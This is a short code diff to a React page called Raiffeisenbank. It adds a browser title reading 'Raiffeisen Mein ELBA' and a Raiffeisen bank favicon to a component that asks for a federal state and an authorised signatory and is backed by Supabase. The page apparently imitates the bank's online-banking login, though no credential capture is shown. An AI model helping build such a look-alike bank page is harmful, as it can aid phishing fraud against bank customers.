@@ -3,7 +3,9 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { ExternalLink, ChevronDown, Check } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
 import bgImage from "@/assets/rbg_wald.jpg";
+import raiffeisenIcon from "@/assets/raiffeisen_bank.png";
 
 const bundeslaender = [
   "Burgenland",
@@ -60,6 +62,7 @@ const Raiffeisenbank = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("Raiffeisen Mein ELBA", raiffeisenIcon);
 
   const [bundesland, setBundesland] = useState("");
   const [verfueger, setVerfueger] = useState("");
